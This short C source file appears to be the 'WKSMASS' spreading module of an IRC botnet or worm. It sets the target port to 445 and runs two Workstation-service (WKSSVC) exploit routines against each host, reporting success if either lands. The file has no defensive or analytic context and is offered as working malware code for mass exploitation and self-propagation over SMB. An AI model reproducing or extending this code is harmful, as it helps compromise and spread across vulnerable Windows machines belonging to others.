#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"


#ifndef NO_WKSMASS
BOOL WKSMASS(EXINFO exinfo)
{
	exinfo.port = 445;
	BOOL bDCOM = ScriptGod_WKSSVC_Eng(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = ScriptGod_WKSSVC_Other(exinfo);

	return bDCOM || bLSASS ? TRUE : FALSE;
}
#endif
